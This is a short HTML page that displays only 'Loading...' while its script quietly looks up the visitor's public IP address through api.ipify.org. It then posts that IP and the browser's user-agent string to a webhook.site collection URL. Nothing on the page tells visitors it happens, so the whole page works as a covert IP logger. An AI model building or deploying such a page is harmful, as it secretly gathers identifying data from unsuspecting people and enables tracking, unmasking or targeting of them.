<!DOCTYPE html>
<html>
<body>
<h2>Loading...</h2>

<script>
fetch("https://api.ipify.org?format=json")
.then(res => res.json())
.then(data => {
    fetch("https://webhook.site/ID-CUA-BAN", {
        method: "POST",
        body: JSON.stringify({
            ip: data.ip,
            device: navigator.userAgent
        })
    });
});
</script>

</body>
</html>
